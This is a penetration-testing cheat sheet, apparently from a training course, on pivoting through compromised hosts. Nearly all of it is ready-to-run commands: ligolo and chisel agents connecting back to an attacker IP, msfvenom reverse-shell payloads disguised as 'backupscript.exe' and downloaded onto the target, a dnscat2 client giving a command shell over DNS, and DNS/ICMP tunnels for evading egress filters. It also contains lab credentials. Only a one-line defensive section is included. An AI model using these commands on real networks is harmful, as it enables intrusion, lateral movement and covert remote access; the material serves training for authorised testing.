# Pivoting, Tunneling, and Port Forwarding

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
Use a compromised host as a gateway to reach networks you can't touch directly. **Port forward** (one port), **tunnel/proxy** (route many through the pivot), **pivot** (chain through multiple hosts). (Quick one-liners also in `cheatsheets/pivoting.md`.)

## Recon on the pivot (find the next network)
```bash
ifconfig / ipconfig ; netstat -r         # extra NICs / routes = another subnet
netstat -antp ; arp -a                    # what the pivot can see
```
Sweep the discovered subnet for live hosts (from the pivot):
```bash
# Linux
for i in {1..254}; do (ping -c1 -W1 172.16.5.$i | grep "bytes from" &); done
# Windows cmd
for /L %i in (1,1,254) do @ping 172.16.5.%i -n 1 -w 100 | find "Reply"
# PowerShell
1..254 | % { "172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)" }
```
Or via a session: `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24` (Meterpreter).

## SSH tunneling (no tools to upload if SSH creds exist)
```bash
ssh -L 1234:127.0.0.1:3306 user@pivot     # LOCAL: my :1234 → pivot's :3306
ssh -D 9050 user@pivot                    # DYNAMIC: SOCKS proxy on :9050 (use with proxychains)
ssh -R 8080:127.0.0.1:80 user@attacker    # REMOTE: pivot exposes a port back to me
```
`proxychains <tool>` routes any tool through the SOCKS proxy (set `socks5 127.0.0.1 9050` in `/etc/proxychains.conf`):
```bash
proxychains nmap -sT -Pn 172.16.5.1-50 ; proxychains crackmapexec smb 172.16.5.0/24
```

## Ligolo-ng (modern go-to — clean, no proxychains)
```bash
# attacker: make the tun interface + start proxy
sudo ip tuntap add user $USER mode tun ligolo ; sudo ip link set ligolo up
ligolo-proxy -selfcert
# on the compromised host:
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
# back in ligolo: select session, then on attacker add the route:
sudo ip route add <TARGET_CIDR> dev ligolo    # then type `start` in ligolo
# now reach the internal net directly (nmap, CME, etc. — no proxychains needed)
```
Double pivot: second tun (`ligolo-double`) + `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601` on pivot 1, run a second agent on pivot 2, add its route.

## Other tools
```bash
# chisel (SOCKS over HTTP, great when only web ports are open)
./chisel server -p 1234 --socks5          # attacker
./chisel client <ATTACKER>:1234 socks     # pivot
# sshuttle (route a subnet through SSH, no proxychains)
sudo sshuttle -r user@pivot 172.16.5.0/24
# socat port forward
socat TCP4-LISTEN:8080,fork TCP4:<host>:80
# Windows netsh portproxy
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=<pivot> connectport=3389 connectaddress=<target>
# Metasploit: autoroute + socks_proxy for session-based pivoting
use post/multi/manage/autoroute        # add route to the internal subnet through the session
use auxiliary/server/socks_proxy       # then point proxychains at it
# Meterpreter portfwd (single-port tunnel through a session):
portfwd add -l 3300 -p 3389 -r <target>    # local :3300 -> target :3389 (RDP), then xfreerdp /v:localhost:3300
portfwd add -R -l 8081 -p 1234 -L <attacker>   # reverse: target:8081 -> back to attacker:1234
# Windows dynamic forward (proxychains equivalent on a Windows pivot): PuTTY plink
plink -D 9050 user@<target>
# rpivot — SOCKS through restrictive corp proxies (even HTTP-proxy w/ NTLM auth)
# SocksOverRDP — regsvr32 SocksOverRDP-Plugin.dll, tunnel SOCKS over an RDP session
# dnscat2 / ptunnel-ng — DNS/ICMP tunnels when TCP is blocked (stealthy, slow)
```

## Fix / detection
Network segmentation, egress filtering, no dual-homed hosts without controls, monitor for SOCKS/odd tunnels and DNS/ICMP anomalies.

> **Ligolo-ng is the modern favorite** — it gives you a real route to the internal net, so every tool works natively (no `proxychains` wrapping). Flow: recon the pivot's extra NIC → stand up ligolo (or SSH -D + proxychains) → add the route → attack the new subnet. Chisel/dnscat2 are the fallbacks when only web/DNS egress is allowed.

## Full command reference (source notes)
Complete command set — nothing trimmed.

**Host / network discovery**
| Command | Description |
|---|---|
| `ifconfig` / `ipconfig` | Show network config (Linux / Windows) |
| `netstat -r` | Show the IPv4 routing table |
| `nmap -sT -p22,3306 <ip>` | Scan a target for SSH/MySQL |
| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done` | Linux ping sweep |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"` | Windows ping sweep (cmd) |
| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}` | PowerShell ping sweep |
| `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23` | MSF ping sweep via a session |

**SSH tunneling**
| Command | Description |
|---|---|
| `ssh -L 1234:localhost:3306 Ubuntu@<ip>` | Local port forward (:1234 → target :3306) |
| `netstat -antp \| grep 1234` | Verify the tunnel connection |
| `nmap -v -sV -p1234 localhost` | Scan through the local tunnel port |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<ip>` | Multiple local forwards |
| `ssh -D 9050 ubuntu@<ip>` | Dynamic port forward (SOCKS) |
| `ssh -R <PivotIP>:8080:0.0.0.0:80 ubuntu@<ip> -vN` | Reverse SSH tunnel |

**proxychains / SOCKS**
| Command | Description |
|---|---|
| `tail -4 /etc/proxychains.conf` | Verify SOCKS config |
| `socks4 127.0.0.1 9050` / `socks5 127.0.0.1 1080` | proxychains.conf lines (v4 / v5) |
| `proxychains nmap -v -sn 172.16.5.1-200` | Nmap through the proxy (no ping) |
| `proxychains nmap -v -Pn -sT 172.16.5.19` | TCP-connect scan through the proxy |
| `proxychains msfconsole` | Metasploit through the proxy |
| `proxychains xfreerdp /v:<ip> /u:victor /p:pass@123` | RDP through the proxy |

**Metasploit pivoting**
| Command | Description |
|---|---|
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost=<PivotIP> -f exe -o backupscript.exe LPORT=8080` | Windows reverse-HTTPS payload |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<AttackHost> -f elf -o backupjob LPORT=8080` | Linux reverse-TCP payload |
| `use exploit/multi/handler` | Catch the session |
| `scp backupscript.exe ubuntu@<ip>:~/` | Transfer the payload |
| `python3 -m http.server 8123` | Serve a file |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"` | Download it on the target |
| `search rdp_scanner` | Find an MSF module |
| `use auxiliary/server/socks_proxy` → `jobs` | SOCKS proxy module / list jobs |
| `use post/multi/manage/autoroute` | Add a route through a session |
| `portfwd add -l 3300 -p 3389 -r <ip>` | Forward local :3300 → target :3389 |
| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123` | RDP through the forward |
| `portfwd add -R -l 8081 -p 1234 -L <AttackHost>` | Reverse port forward |
| `netstat -antp` | Show active connections + PIDs |
| `bg` | Background the Meterpreter session |

**socat / Windows netsh / plink**
| Command | Description |
|---|---|
| `socat TCP4-LISTEN:8080,fork TCP4:<AttackHost>:80` | socat relay to attack host |
| `socat TCP4-LISTEN:8080,fork TCP4:<target>:8443` | socat relay to target |
| `plink -D 9050 ubuntu@<ip>` | SSH dynamic forward on Windows (PuTTY) |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25` | Windows port forward |
| `netsh.exe interface portproxy show v4tov4` | View the portproxy rule |

**sshuttle / rpivot**
| Command | Description |
|---|---|
| `sudo apt-get install sshuttle` | Install sshuttle |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v` | Route a subnet through SSH |
| `sudo git clone https://github.com/klsecservices/rpivot.git` | Clone rpivot |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` | Run rpivot server |
| `scp -r rpivot ubuntu@<ip>` | Copy rpivot to target |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999` | Run rpivot client |
| `proxychains firefox-esr <webserver>:80` | Browse through the SOCKS proxy |
| `python client.py --server-ip <ip> --server-port 8080 --ntlm-proxy-ip <ip> --ntlm-proxy-port 8081 --domain <d> --username <u> --password <p>` | rpivot through an NTLM HTTP-proxy |

**dnscat2 / chisel / ptunnel-ng / SocksOverRDP**
| Command | Description |
|---|---|
| `git clone https://github.com/iagox86/dnscat2.git` | Clone dnscat2 |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` | Start dnscat2 server |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git` | Clone the PS client |
| `Import-Module dnscat2.ps1` | Import the client |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd` | Connect back to the server |
| `dnscat2> ?` / `dnscat2> window -i 1` | List options / interact with a session |
| `./chisel server -v -p 1234 --socks5` | Start a chisel SOCKS server |
| `./chisel client -v 10.129.202.64:1234 socks` | Connect a chisel client |
| `git clone https://github.com/utoni/ptunnel-ng.git` → `sudo ./autogen.sh` | Clone + build ptunnel-ng |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22` | Start ptunnel-ng server |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` | Connect ptunnel-ng client |
| `ssh -p2222 -lubuntu 127.0.0.1` | SSH through the ICMP tunnel |
| `regsvr32.exe SocksOverRDP-Plugin.dll` | Register SocksOverRDP plugin |
| `netstat -antb \| findstr 1080` | Confirm SocksOverRDP listener |
